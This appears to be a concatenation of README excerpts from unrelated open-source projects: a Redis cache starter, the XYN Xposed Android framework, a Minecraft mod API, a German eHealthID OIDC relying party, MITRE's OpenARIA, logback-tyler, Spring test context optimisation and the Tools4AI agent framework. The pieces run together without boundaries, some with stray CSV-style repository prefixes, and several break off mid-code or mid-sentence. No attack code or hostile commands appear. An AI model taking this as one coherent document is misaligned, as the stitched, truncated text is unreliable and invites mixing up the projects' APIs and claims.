        final Optional<MyCacheTemplate> templateOptional = myProvider.getTemplate(""ds1"");

        if (templateOptional.isPresent()) {
            final MyCacheTemplate cacheTemplate = templateOptional.get();

            // Custom Methods
            cacheTemplate.test();

        }
    }

}
```

#### CacheDatasource custom redisson configuration

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. For example, custom setting the encoding of redisson serialization and deserialization while enabling the new CacheDatasource.

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<CacheTemplate> cacheDatasource() {
        return new DefaultCacheDatasource(){
            @Override
            public Consumer<CacheKeeperConfig> configPostProcessor(Consumer<CacheKeeperConfig> consumer) {
                return v -> v.getConfig().setCodec(new JsonJacksonCodec());
            }
        };
    }

}
```

#### What's the XYN Xposed?
XYN Xposed is a next generation Xposed framework, which based on the [ART TI](https://source.android.google.cn/docs/core/runtime/art-ti) and will not resolve or hook any unexported symbol from libart.so  
Since Android 15, Google stripped all symbols from libart.so and caused billions of reinforced apps crash.  
Using this framework will not affect the behaviour above Andorid 15 and will only make methods interpret without compiled.  
With the ART TI (ART Tooling Interface), you can debug your app and even integrate it inside [Mundo](https://github.com/Katana-Official/SPatch-Update/releases).  
We're using part of the AOSP feature, which was already included inside the AOSP CTS tests, and won't be removed in the future Android versions, this will be much stable than libart symbol based method. You can read the introduction [here](https://source.android.google.cn/docs/core/runtime/art-ti#validation).

## Overview
Accessories is a Data-Driven Accessory mod for NeoForge and Fabric with emphasis on using a Common API for both platforms when possible

<p/>
  
This API is based on the works of [Curios](https://github.com/TheIllusiveC4/Curios) and [Trinkets](https://github.com/emilyploszaj/trinkets) with credit going to both [TheIllusiveC4](https://github.com/TheIllusiveC4) and [emilyploszaj](https://github.com/emilyploszaj) for their work on Accessory mods for Minecraft.

# OpenID Connect Relying Party for GesundheitsID (eHealthID)

The goal is to provide a simple standalone server exposing Germany's 'GesundheitsID' (eHealthID) as
a good old OpenID Connect Relying Party (OIDC RP).

Identity Providers such as Keycloak can link accounts with OIDC out-of-the-box

## State of Compatibility

### Productive Environment (PU)

In short:

- `Bitmarck/RISE` does not work
- `IBM/Verimi` works

> [!NOTE]  
> Most providers can not be independently tested as there are no test accounts available.

## Contents

- [ehealthid-rp](./ehealthid-rp) - A standalone application to act as a OpenID Connect (OIDC)
  Relying Party. Bridges OIDC and Germany's GesundheitsID OpenID federation.
- [ehealthid-cli](./ehealthid-cli) - A script to generate keys and federation registration forms.
- [ehealthid](./ehealthid) - A plain Java library to build RelyingParties for GesundheitsID.
    - API clients
    - Models for the EntityStatments, IDP list endpoints etc.
    - Narrow support for the 'Fachdienst' use-case.

# Quickstart

```shell

#---- 1. generate keys
# the URI where your relying-party will run, 
# for the registration this _MUST_ be publicly reachable
export ISSUER_URI=https://mydiga.example.com

# generate keys for the application, keep those safe and secure
./cli.sh keygen --issuer-uri=$ISSUER_URI

#---- 2. deploy the relying party
docker run --rm \
    -v ""$(pwd)""/sig_mydiga_example_com_jwks.json:/secrets/sig_jwks.json:ro \
    -e ""EHEALTHID_RP_APP_NAME=Awesome DiGA"" \
    -e ""EHEALTHID_RP_BASE_URI=$ISSUER_URI"" \
    -e 'EHEALTHID_RP_FEDERATION_ES_JWKS_PATH=/secrets/sig_jwks.json' \
    -e 'EHEALTHID_RP_FEDERATION_MASTER=https://app-test.federationmaster.de' \
    -e 'EHEALTHID_RP_REDIRECT_URIS=https://sso-mydiga.example.com/auth/callback' \
    -e 'EHEALTHID_RP_ES_TTL=PT5M' \
    -e 'EHEALTHID_RP_IDP_DISCOVERY_URI=https://sso-mydiga.example.com/.well-known/openid-configuration' \
    -p 1234:1234 \
    ghcr.io/oviva-ag/ehealthid-relying-party:latest

#---- 3. register with the federation master

# a string received from Gematik as part of the registration process
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
export MEMBER_ID=FDmyDiGa0112TU

# generate the registration XML from an existing entity statement
./cli.sh fedreg \
    --environment=TU \
    --contact-email=bobby.tables@example.com \
    --issuer-uri=$ISSUER_URI \
    --member-id=""$MEMBER_ID""
    
# this prints the XML for registration in the federation, send it
# as an email attachment to Gematik 
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

# Welcome to OpenARIA

This repository contains an open-source edition of the _Aviation Risk Identification and Assessment_ (ARIA) software
program developed by MITRE on behalf of the Federal Aviation Administration's (FAA) Safety and Technical Training (AJI)
Service Unit.

## OpenARIA's Goal

Our goal is to build a community focused on improving aviation safety & efficiency by extracting value from aircraft
location data.

## How OpenARIA can achieve this Goal

1. Provide a publicly available solution for **detecting aviation risks** within aircraft location data.
    - This tangible working solution can be critiqued by the community and improved as necessary.


2. Provide a publicly available solution for detecting **and then aggregating** aviation risks for bulk
   analysis.
    - Someone operating `OpenARIA` for a day will have one day's worth of output
    - Someone operating `OpenARIA` for a year will have a year's worth of output.
    - We must facilitate capturing and utilizing large amounts of output data.


3. Provide a publicly available solution for **archiving and replaying** aircraft location data
    - E.g., when `OpenARIA` detects _an event_, we will want to be able to replay the event to understand what happened.


4. Provide solutions that work with near-real time data streams as well as archival data.

# Getting Started

- Learn about important ongoing work [here](./docs/ADRs/supportingNewFormats.md)
  and [here](./docs/ADRs/pointInterfaceCritique2.md)
- Learn about the supported data formats [here](./docs/csv-data-format.md)
    - **Important Caveat:** The initial code commit includes a dependency that is not available in the open source
      domain.
    - We are working to remove this blocker by:
        1. Proposing [this](./docs/csv-data-format.md) data format (which will replace the legacy format)
        2. Adding support for this new data format
        3. Refactoring the code so the closed-source dependency is no longer used or required.
        4. Building the project using **only** GitHub Actions and publicly available dependencies
    - You can view the progress of this work by browsing the branches of the project.
- To begin **detecting aviation events** see [here](./docs/how-to/detect-encounters.md)
- To begin **archiving and replaying** aircraft location data see [here](./docs/how-to/replay-encounters.md)
- To begin detecting **and then aggregating** aviation data see [here](./docs/how-to/aggregate-encounters.md)_

## Building from Source

1. First clone the project: `git clone git@github.com:mitre-public/open-aria.git`
2. Navigate to project directory `cd {PATH_TO_REPOSITORY}/open-aria`
3. Run: `./gradlew shadowJar`
    - This command launches a build plugin that collects all compiled code and dependencies into a single
      jar (aka _uber jar_, _shadow jar_, or _fat jar_)
4. Find the _uber jar_ in: 
    - `{PATH_TO_REPOSITORY}/open-aria/open-aria-deploy/libs/build`
    - The _uber jar_ will have a name like: `open-aria-0.1.0-SNAPSHOT-uber.jar`

## Downloading Pre-Built Artifact
There are 2 places to simply download a pre-built artifact
1. Download a full release from [here](https://github.com/mitre-public/open-aria/releases)
   - **Coming soon** (ETA = June 1st)
2. Download the artifact produced during a recent execution of the CI/CD system.
   - Click [here](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml) to see the list of recent builds
   - Click on any build from the last 90 days (GitHub stores build artifacts for 90-days)
   - Download the Artifact named: `Deployable-Uber-Jar`

qos-ch/logback-tyler,main,"# logback-tyler

Logback-tyler translates logback-classic XML configuration files into Java.

The resulting java class named `TylerConfigurator` implements the
[`Configurator`](https://logback.qos.ch/xref/ch/qos/logback/classic/spi/Configurator.html)
interface. It can thus be declared as a custom configuration provider
using Java's standard
[service-provider](https://docs.oracle.com/javase/6/docs/api/java/util/ServiceLoader.html)
meachanism. Custom configurators are searched by looking up a provider-configuration file
resource located under the
_META-INF/services/ch.qos.logback.classic.spi.Configurator_ file in
your project. This provider-configuration should contain a line with the fully
qualified class name of your desired configurator.

Running `TylerConfigurator` does not require XML parsers and usually
executes noticeably faster than `JoranConfigurator`, logback's XML
configurator. Moreover, `TylerConfigurator` does not use
reflection. In addition, given that it ships with your project's
binaries, it is harder to modify and offers an even smaller attack
surface.

At runtime, `TylerConfigurator` does not have any additional
dependencies other than logback-classic version 1.5.10. 

## Online instance
A instance of logback-tyler translator is available [**online**](https://logback.qos.ch/translator/services/xml2Java.html). 
Do not hesitate to experiment with it.

## Running the translator locally

Logback-tyler is located at the following Maven coordinates:
```xml
 <groupId>ch.qos.logback.tyler</groupId>
 <artifactId>tyler-base</artifactId>
 <version>0.9</version>
```

Here is a sample program to translate a logback.xml as string into Java.
  
```java
import ch.qos.logback.core.joran.spi.JoranException;
import ch.qos.logback.core.model.Model;
import ch.qos.logback.core.util.StatusPrinter;

import java.io.IOException;

public class TylerExample {

    String xmlInput =
    """"""
            <configuration debug=""true"">
              <import class=""ch.qos.logback.classic.encoder.PatternLayoutEncoder""/>
              
              <property name=""APP_NAME"" value=""myApp""/>
             
              <contextName>${APP_NAME}</contextName>
             
              <appender class=""ch.qos.logback.core.FileAppender"" name=""TOTO"">
                <file>toto.log</file>
                <append>true</append>
                <immediateFlush>true</immediateFlush>
                <encoder>
                  <pattern>%-4relative [%thread] %-5level %logger{35} -%kvp- %msg%n</pattern>
                </encoder>   
              </appender>         
             
             
              <root level=""DEBUG"">
                <appender-ref ref=""TOTO""/>
              </root>             
            </configuration>                 
    """""";
    
    public static void main(String[] args)  throws JoranException, IOException {
        ContextBase context = new ContextBase();
        ModelToJava m2j = new ModelToJava(context);
        Model model = m2j.extractModel(xmlInput);
        String result = m2j.toJava(model);
        System.out.println(result);
        // print any error messages occuring during the translation
        StatusPrinter.print(context);
    }
}
```

running the above program will produce the following output

```java


import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.LoggerContext;
import ch.qos.logback.classic.encoder.PatternLayoutEncoder;
import ch.qos.logback.classic.spi.Configurator;

 *
 * <p>You may experiment with logback.xml to Java translation, i.e.
 * TylerConfigurator generation, at the following URL:</p>
 *
 * <p>      https://logback.qos.ch/translator/services/xml2Java.html </p>
 *
 * <p>This generated TylerConfigurator class is intended to be copied and integrated
 * into the user's project as a custom configurator. It will configure logback
 * without XML. You are free to rename TylerConfigurator as you wish.</p>
 *
 * <p>It requires logback-classic version 1.5.11 or later at runtime.</p>
 *
 * <p>Custom configurators are looked up via Java's service-provide facility. If a
 * custom provider is found, it takes precedence over logback's own configurators,
 * e.g. DefaultJoranConfigurator.</p>
 *
 * <p>To install your custom configurator to your project, add a
 * provider-configuration file to the following path:</p>
 *
 * <pre>  META-INF/services/ch.qos.logback.classic.spi.Configurator</pre>
 *
 * <p>This provider-configuration file should contain a line with the fully

 *
 * <p>See also item 1 of 'Configuration at initialization' section at </p>
 *
 * <p>  https://logback.qos.ch/manual/configuration.html#auto_configuration</p>
 *
 * <p>With recent versions of logback and logback-tyler you can still
 * configure logger levels dynamically using properties files. Note that
 * configuration files in properties format can be watched for
 * changes. See the documentation on PropertiesConfigurator for more details.</p>
 *

# What is Nest Problem?

Given a square piece of material and some letters to be laser-cut:

We want to pack all the letters into the square, using as little material as possible. If a single square is not enough,
we also want to minimize the number of squares used.

In the CNC world this is called ""nesting"", and software that does this is typically targeted at industrial customers and
very expensive.

seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes if they declare
own `@ContextConfiguration` or `@Import` of spring beans.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:

`Develocity Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.8</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.8"")
```
Also it's recommended to configure `""INFO""` level for `com.github.seregamorph.testsmartcontext` logger.
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(listeners = {
        SmartDirtiesContextTestExecutionListener.class
}, mergeMode = TestExecutionListeners.MergeMode.MERGE_WITH_DEFAULTS)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(listeners = {
        SmartDirtiesContextTestExecutionListener.class
}, mergeMode = TestExecutionListeners.MergeMode.MERGE_WITH_DEFAULTS)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(listeners = {
        SmartDirtiesContextTestExecutionListener.class
}, mergeMode = TestExecutionListeners.MergeMode.MERGE_WITH_DEFAULTS)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)

# üí° Tools4AI
Tools4AI is 100% Java based Agentic Framework which can be used to build Java based AI agents for integration with enterprise 
Java applications.
This project illustrates the integration of AI with enterprise tools or external tools, converting natural language prompts
into <span style=""font-size: larger;"">**actiona ble behaviors**.</span> These prompts can be called <span style=""font-size: larger;"">**""action prompts""**</span>
or <span style=""font-size: larger;"">**""actionable prompts""**</span>  By leveraging AI capabilities, it streamlines user interactions
with complex systems, enhancing productivity and innovation across diverse applications.<br>

For example , we can integrate AI with a customer service application. Users can interact with the AI system by asking<br> 
questions or making requests in natural language. For example, a user might ask,**""Schedule a maintenance <br>
appointment for my car.""** The AI system interprets the request, extracts relevant information such as the <br>
service required and preferred date, and then triggers the appropriate action in the customer service<br>
application to schedule the appointment. This seamless integration streamlines the process for users and<br>
enhances the efficiency of the customer service workflow.

| Submit a reimbursement request for the <span style=""color:blue"">**business**</span> trip <span style=""color:blue"">**expenses.**</span>                                                     | The AI system guides the user through the reimbursement request process, collecting necessary details such as expense receipts, dates, amounts, and purpose of expenditure. Once compiled, the system submits the reimbursement request to the appropriate department for processing. |



Prompt prediction is a technique used to anticipate user actions based on their input prompts. For instance,
if a user's prompt is ""my car broke down,"" in addition to the action ""bookTaxi,"" the AI system can predict a
set of subsequent actions such as ""bookCarService"" and ""orderFood"" (if it's dinner time). This predictive
capability enhances the user experience by proactively suggesting relevant actions or services based on the
context provided in the prompt.

## Java Actions

Fastest way to create action is by writing a java class  and  annotate its method with ```@Action```
annotation.

**Java Actions:** These are Java classes that have methods with ```@Action``` annotation . They are designed to 
perform specific actions based on prompts processed through Tools4AI.  

**@Predict Annotation:** This is a <u>class level</U> annotation. This annotation is used to add the action to the prediciton list, doing this will make sure
the action is called automatically when the prompt is processed and if the prompt matches with the action (action name or method name). All the methods 
in this class annotated with @Action will be added to the prediction list.

**@Action Annotation:** This is a <u>method level</u> annotation. The action method within the Java class is annotated with @Action to specify the action's behaviour
this is the actual method which will be triggered if the prompt matches by AI. You can have as many methods as you want with @Action
annotation in the class.

**Method Execution:** When a prompt like ""My friend's name is Vishal, I don‚Äôt know what to cook for him today."" 
is processed, the ```whatFoodDoesThisPersonLike``` method is automatically called with ""Vishal"" as the argument, 
and it returns ""Paneer Butter Masala"" as Vishal's preference. 
``` 
@Predict
public class SimpleAction  {

    @Action( description = ""what is the food preference of this person"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
This class can contain any number of methods both public or private. All the methods with ```@Action``` annotation  
in this class are going be added to the prediction list. In this case it is just ```whatFoodDoesThisPersonLike```.

This method can contain any number of parameters (Objects, Pojos, Arrays etc) and can be of have any return value, everythign will 
be mapped at runtime using prompt. ```@Action``` annotation also takes additional values for ActionRisk and Description.

When you send a prompt to  action processor (OpenAIActionProcessor, GeminiActionProcessor or AnthoripicActionProcessor)
``` 
 String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String functionResponse = (String)tra.processSingleAction(cookPromptSingleText);
 //functionResponse will be Paneer Butter Masala
 String aiResponse = tra.query(cookPromptSingleText,functionResponse);
 //aiResponse will be well forumulated response something like ""Hey looks like your friend likes Panner Butter Masala
```

The above action will be called with ``` name = Vishal``` automatically based on the action name and prompt type.
AI will figure out that this is the correct action to call. You can also add grouping information in Predict annotation to 
make it even more targeted. You don't have to specify the Action explicitly if its not a High Risk action

**Convert prompt to Pojo**

You can convert any Prompt into a Java Pojo object. Your pojo can be simple or complex , it can have arrays, list
maps and other pojos and they all will be mapped based on the prompt

```
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptText = ""Mhahrukh Khan works for MovieHits inc and his salary is $ 100  he joined Toronto on 
Labor day, his tasks are acting and dancing. He also works out of Montreal and Bombay. Krithik roshan is 
another employee of same company based in Chennai his taks are jumping and Gym he joined on Indian Independce
 Day"";
Organization org = (Organization) tra.transformIntoPojo(promptText, Organization.class.getName(),"""","""");
Assertions.assertTrue(org.getEm().get(0).getName().contains(""Mhahrukh""));
Assertions.assertTrue(org.getEm().get(1).getName().contains(""Krithik""));
```
The above code will map the prompt and convert into [Organization](src/test/java/com/t4a/examples/pojo/Organization.java) Pojo object 

**Trigger Action**

Trigger action based on prompt, in case its MyDiary action [MyDiaryAction](src/test/java/com/t4a/examples/actions/MyDiaryAction.java)

```
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""I have dentist appointment on 3rd July, then i have Gym appointment on 7th August 
 and I am meeting famous Bollywood actor Shahrukh Khan on 19 Sep. My friends Rahul, Dhawal, Aravind are 
 coming with me. My employee Jhonny Napper is comign with me he joined on Indian Independce day.
 My customer name is Sumitabh Bacchan he wants to learn acting form me he joined on labor day"";
 MyDiaryAction action = new MyDiaryAction();
 MyDiary dict = (MyDiary) tra.processSingleAction(promptText,action);
 log.info(dict.toString()); 
```

If you do not specify any action then it will be predicted based on prompt and groups for example

```
MyDiary dict = (MyDiary) tra.processSingleAction(promptText)
```
As you can notice we are not passing any action with the prompt the AI will figure out the action correctly

A simple Java action can be written like this 

```
@Predict(groupName = ""buildMyDiary"" , groupDescription = ""This is my diary details"")
public class MyDiaryAction implements JavaMethodAction {
    @Action  
    public MyDiary buildMyDiary(MyDiary diary) {
        //take whatever action you want to take
        return diary;
    }
} 
```
Here the actionName is ```buildMyDiary```, MyDiary pojo will be created automatically based on prompt

**Action groups**

```
@Predict(groupName = ""personal"", groupDescription = ""all personal actions are here"") 
```
Actions have to be annontated with @Predict to be added to prediction list , they can be grouped together with
the groupName.

**Custom Pojo**

There are different annontations which be used for special Pojo mapping

**Mapping list**

```
    @ListType(Employee.class)
    List<Employee> em;
    @ListType(String.class)
    List<String> locations; 
```

**Mapping Maps in objects**
``` 
@Predict(actionName = ""addSports"",description = ""add new Sports into the map"")
public class MapAction implements JavaMethodAction {

    public Map<Integer,String> addSports(@MapKeyType(Integer.class)  @MapValueType(String.class) Map<Integer,String> mapOfSportsName) {

        return mapOfSportsName;
    }
}

```

**Special Instructions**

``` 
@Prompt(describe = ""convert this to Hindi"")
private String reasonForCalling;
```

The above instruction will fetch the reason for calling from the user prompt and convert it into Hindi and put
it inside the ```reasonForCalling``` String

**Ignore Field**
```
    @Prompt(ignore = true)
    private String location;
```
If you do not want to populate a field you can annotate it as ignore

**Format Date**

```
    @Prompt(dateFormat = ""yyyy-MM-dd"" ,describe = ""if you dont find date provide todays date in fieldValue"")
    private Date dateJoined;
```
The above will fetch the dateJoined from the prompt and convert it into the format. So if your prompt is
""Book my dinner reservation on Indian Independence day"" , the dateJoined will be 2024-08-15

**Muliple Special Prompts**
```
 public class MyTranslatePojo {
    @Prompt(describe = ""translate to Hindi"")
    String answerInHindi;
    @Prompt(describe = ""translate to Punjabi"")
    String answerInPunJabi;

    @Prompt(describe = ""translate to Tamil"")
    String answerInTamil;
}
```
The above Pojo can be used to translate the prompt in multiple language and populate the result in variables

``` 
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptTxt = ""paneer is so good"";
MyTranslatePojo myp = (MyTranslatePojo)tra.transformIntoPojo(promptTxt,MyTranslatePojo.class.getName());
System.out.println(myp);
```

Result will look something like this 

``` MyTranslatePojo(answerInHindi=‡§™‡§®‡•Ä‡§∞ ‡§á‡§§‡§®‡§æ ‡§Ö‡§ö‡•ç‡§õ‡§æ ‡§π‡•à, answerInPunJabi=‡®™‡®®‡©Ä‡®∞ ‡®¨‡®π‡©Å‡®§ ‡®µ‡®ß‡©Ä‡®Ü ‡®π‡©à, answerInTamil=‡Æ™‡Æ©‡ØÄ‡Æ∞‡Øç ‡Æé‡Æ™‡Øç‡Æ™‡Æü‡Æø ‡Æ®‡Æ≤‡Øç‡Æ≤‡Æ§‡ØÅ) ```

**High Risk Actions**  
There might be some actions which you do not want to be triggered automatically but passed explicitly in the processor
such actions can be annotated with HighRisk

```
@Predict(actionName = ""restartTheECOMServer"",description = ""will be used to restart the server"" , 
riskLevel = ActionRisk.HIGH, groupName = ""customer support"", 
groupDescription = ""actions related to customer support"")
public class ServerRestartAction implements JavaMethodAction {
    public String restartTheECOMServer(String reasonForRestart, String requestedBy) {
        return "" Server has been restarted by ""+requestedBy+"" due to following reason ""+reasonForRestart;
    }
}

```
The above action is marked as High Risk action so if you try to call it with simple prompt

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
String functionResponse = (String)processor.processSingleAction(""restartPrompt"");

```
It will not be triggered even though the AI will correct identify which action to trigger still it will get blocked.

You will have to call it explicitly this way

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
ServerRestartAction restartAction = new ServerRestartAction();
String functionResponse = (String)processor.processSingleAction(""restartPrompt"", restartAction);
```


## HTTP Actions (Swagger)

Any application exposing HTTP REST API can be converted into actions for example here is my sample [swagger_actions.json.](https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub/blob/main/swagger_actions.json)
All the REST calls such as get, post, put, delete will be mapped to actions and based on the prompts they can be triggered
automatically

``` 
{
  ""endpoints"" : [
    {
      ""swaggerurl"": ""https://fakerestapi.azurewebsites.net/swagger/v1/swagger.json"",
      ""group"": ""Books Author Activity"",
      ""description"": ""This is for all the actions related books , Authors, photos and users trying to read books and view photos"",
      ""baseurl"": ""https://fakerestapi.azurewebsites.net/"",
      ""id"": ""fakerestapi""
    },
    {
      ""swaggerurl"": ""https://petstore3.swagger.io/api/v3/openapi.json"",
      ""baseurl"": ""https://petstore3.swagger.io/"",
